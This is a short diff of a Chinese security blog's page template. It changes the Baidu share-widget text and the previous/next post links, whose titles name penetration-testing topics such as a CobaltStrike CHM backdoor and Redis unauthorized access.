+            
         
     </div>
     <style>
@@ -413,7 +396,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"CobaltStrike实现Chm后门　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"某出版社漏洞大礼包　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -433,15 +416,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/01/09/74cms-tempelate-log-include-shell/" title="Pre: 骑士CMS 模板文件日志包含Getshell">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
         
 
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/01/07/redis/" title="Next: Redis未授权访问">
+            <a href="/2021/01/10/sc-powershell-serivces-yincang/" title="Next: SC实现隐藏Windows服务维持权限">
                 <i class="fa fa-angle-right"></i>
             </a>
         
